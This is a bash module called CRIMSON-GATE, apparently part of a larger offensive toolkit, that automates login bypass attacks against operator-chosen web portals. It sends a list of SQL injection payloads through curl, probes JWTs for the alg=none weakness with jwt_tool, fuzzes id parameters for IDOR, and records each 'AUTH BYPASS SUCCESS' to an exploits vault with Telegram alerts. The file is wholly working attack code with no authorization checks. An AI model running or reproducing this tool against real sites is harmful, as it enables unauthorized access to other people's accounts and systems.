#!/usr/bin/env bash
## CRIMSON-GATE — Auth Bypass Assistant (Additive module)
## This module is strictly additive and only triggers after CRAWL when invoked.

[[ -n "${BYPASS_SOURCED:-}" ]] && return
export BYPASS_SOURCED=true

crimson_gate_main() {
    local acct_file="${TARGET_DIR}/websites/user_account_links.txt"
    [[ ! -s "$acct_file" ]] && return 0

    # Build list of unique login endpoints
    mapfile -t LOGIN_PAGES < <(grep -E "login|signin|auth|account|register" "$acct_file" 2>/dev/null | sort -u)
    [[ ${#LOGIN_PAGES[@]} -eq 0 ]] && return 0

    # Interactive selection (non-interactive -> skip)
    if [[ ! -t 0 ]]; then
        log INFO "CRIMSON-GATE: Non-interactive session, skipping manual bypass step."
        return 0
    fi

    echo "[?] Login portals detected. Enter the URL you wish to bypass (or type 'skip' to continue automation):"
    for i in "${!LOGIN_PAGES[@]}"; do
        printf " %3d) %s\n" $((i+1)) "${LOGIN_PAGES[$i]}"
    done

    read -r -p "Selection (enter list NUMBER to choose, or paste FULL URL, or type 'skip' to continue): " sel
    [[ -z "$sel" ]] && { echo "Skipping CRIMSON-GATE"; return 0; }
    if [[ "$sel" =~ ^[Ss]kip$ ]]; then
        echo "Skipping CRIMSON-GATE"
        return 0
    fi

    local TARGET_URL
    if [[ "$sel" =~ ^[0-9]+$ ]]; then
        local idx=$((sel-1))
        TARGET_URL="${LOGIN_PAGES[$idx]}"
    else
        TARGET_URL="$sel"
    fi

    [[ -z "$TARGET_URL" ]] && { echo "No valid URL selected. Aborting CRIMSON-GATE."; return 0; }

    # Create isolated workspace
    local BG_PID=$$
    local TG_DIR; TG_DIR=$(mktemp -d "/tmp/crimson_gate_${BG_PID}.XXXX")
    trap "rm -rf '$TG_DIR' 2>/dev/null || true" RETURN EXIT

    log WARN "CRIMSON-GATE: Running smart probes against: ${TARGET_URL} (workspace: ${TG_DIR})"

    # Run smart probes sequentially
    sqli_auth_bypass "$TARGET_URL" "$TG_DIR" || true
    jwt_cookie_inspect  "$TARGET_URL" "$TG_DIR" || true
    idor_fuzz_check     "$TARGET_URL" "$TG_DIR" || true

    return 0
}

sqli_auth_bypass() {
    local url="$1"; local workdir="$2"
    local payloads=("' OR 1=1 --" "' OR '1'='1' --" "admin' --" "' OR 'a'='a' --" "') OR ('1'='1' --" "' OR 1=1#" "\" OR 1=1 --" "' OR '1'='1' /*" "' OR EXISTS(SELECT 1) --" "' OR SLEEP(0) --")
    mkdir -p "$workdir"
    local attempt=0
    for p in "${payloads[@]}"; do
        attempt=$((attempt+1))
        # Try POST with common form fields
        local post_data="username=${p}&user=${p}&email=${p}&password=${p}&pass=${p}"
        local hdrs="$workdir/headers_${attempt}.txt"
        local body="$workdir/body_${attempt}.txt"
        # Do not follow redirects so we can catch 302s
        curl -s -S -X POST -d "$post_data" -D "$hdrs" -o "$body" "$url" --connect-timeout 10 --max-time 15
        # Check for 302 Location or dashboard keywords
        if grep -qiE "^HTTP/|Location:" "$hdrs" 2>/dev/null; then
            if grep -qi "Location:.*dashboard\|Location:.*/dashboard" "$hdrs" 2>/dev/null || grep -qi "^HTTP/.+ 302" "$hdrs" 2>/dev/null; then
                record_bypass "SQLi-Auth-Bypass" "$url" "POST payload ${p}" "$workdir/body_${attempt}.txt"
                return 0
            fi
        fi
        if grep -qiE "dashboard|welcome|logout|my account|myaccount" "$body" 2>/dev/null; then
            record_bypass "SQLi-Auth-Bypass" "$url" "POST payload ${p}" "$workdir/body_${attempt}.txt"
            return 0
        fi
        # Also try GET param injection
        local test_url="${url}?username=$(urlencode "$p")&password=$(urlencode "$p")"
        curl -s -S -D "$hdrs" -o "$body" "$test_url" --connect-timeout 10 --max-time 15
        if grep -qi "^HTTP/.+ 302" "$hdrs" 2>/dev/null || grep -qiE "dashboard|welcome|logout|my account" "$body" 2>/dev/null; then
            record_bypass "SQLi-Auth-Bypass" "$test_url" "GET payload ${p}" "$workdir/body_${attempt}.txt"
            return 0
        fi
    done
    log INFO "CRIMSON-GATE: SQLi auth bypass probes completed (no success)."
    return 1
}

jwt_cookie_inspect() {
    local url="$1"; local workdir="$2"
    local hdrs="$workdir/headers_jwt.txt"
    curl -s -S -I -D "$hdrs" "$url" --connect-timeout 8 --max-time 12 || true
    # Search headers for potential JWT tokens (looks like 'eyJ')
    local token; token=$(grep -Eo "eyJ[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}" "$hdrs" | head -n1 || true)
    if [[ -n "$token" ]]; then
        log WARN "CRIMSON-GATE: Found potential JWT in headers"
        # Try to decode header and inspect alg
        local header_b64; header_b64=$(echo "$token" | cut -d'.' -f1)
        local hdr_json; hdr_json=$(b64url_decode "$header_b64" 2>/dev/null || echo "{}")
        if echo "$hdr_json" | grep -qi '"alg"\s*:\s*"none"'; then
            record_bypass "JWT-none-alg" "$url" "JWT header alg=none" "$hdrs"
            return 0
        fi
        # If jwt_tool available, run additional checks
        if command -v jwt_tool >/dev/null 2>&1; then
            jwt_tool -t "$token" --attack none 2>/dev/null | tee "$workdir/jwt_attack.txt" || true
            if grep -qi "vulnerable\|none" "$workdir/jwt_attack.txt" 2>/dev/null; then
                record_bypass "JWT-vuln" "$url" "jwt_tool found weakness" "$workdir/jwt_attack.txt"
                return 0
            fi
        fi
    fi
    log INFO "CRIMSON-GATE: JWT/Cookie inspection completed (no issues found)."
    return 1
}

idor_fuzz_check() {
    local url="$1"; local workdir="$2"
    # Detect numeric param like id= or user=
    if [[ "$url" =~ ([&?])(id|user|uid|account)=([0-9]+) ]]; then
        local param=${BASH_REMATCH[2]}
        local value=${BASH_REMATCH[3]}
        mkdir -p "$workdir"
        local base_url; base_url=$(echo "$url" | sed -E "s/([&?])${param}=${value}/\1${param}=%s/")
        local orig_size; orig_size=$(curl -s -o /dev/null -w '%{size_download}' "$url" --connect-timeout 8 --max-time 12)
        for delta in -2 -1 1 2 10; do
            local test_val=$((value + delta))
            local test_url=$(printf "$base_url" "$test_val")
            local size; size=$(curl -s -o /dev/null -w '%{size_download}' "$test_url" --connect-timeout 8 --max-time 12)
            if [[ -n "$size" && "$size" -ne "$orig_size" ]]; then
                record_bypass "IDOR-suspect" "$test_url" "size changed (${orig_size} -> ${size})" "$workdir"
                return 0
            fi
        done
    fi
    log INFO "CRIMSON-GATE: IDOR fuzz completed (no anomalies)."
    return 1
}

record_bypass() {
    local kind="$1"; local target="$2"; local note="$3"; local evidence="$4"
    mkdir -p "${VAULT_PATH}/EXPLOITS" 2>/dev/null || true
    local out_file="${VAULT_PATH}/EXPLOITS/auth_bypass_success.txt"
    printf "%s | %s | %s | %s\n" "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$kind" "$target" "$note" >> "$out_file"
    # Attach evidence if available
    if [[ -n "$evidence" ]]; then
        cp -r "$evidence" "${VAULT_PATH}/EXPLOITS/" 2>/dev/null || true
    fi
    # Send critical alert
    if command -v tg_alert >/dev/null 2>&1; then
        tg_alert "CRITICAL" "🚨 <b>AUTH BYPASS SUCCESS</b>\nTarget: <code>${TARGET}</code>\nType: <code>${kind}</code>\nURL: <code>${target}</code>\nNote: <code>${note}</code>\nSaved: <code>${out_file}</code>"
    elif command -v tg_send >/dev/null 2>&1; then
        tg_send "🚨 AUTH BYPASS: ${kind} on ${target} — saved to ${out_file}"
    fi
}

# Utility: URL-encode
urlencode() {
    python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1"
}

# Utility: base64url decode
b64url_decode() {
    local s="$1"
    # Pad
    local rem=$(( ${#s} % 4 ))
    if [[ $rem -eq 2 ]]; then s+="=="; elif [[ $rem -eq 3 ]]; then s+="="; fi
    s=${s//-/+}
    s=${s//_/\/}
    echo "$s" | base64 -d 2>/dev/null || true
}

export -f crimson_gate_main sqli_auth_bypass jwt_cookie_inspect idor_fuzz_check record_bypass urlencode b64url_decode

## End of CRIMSON-GATE
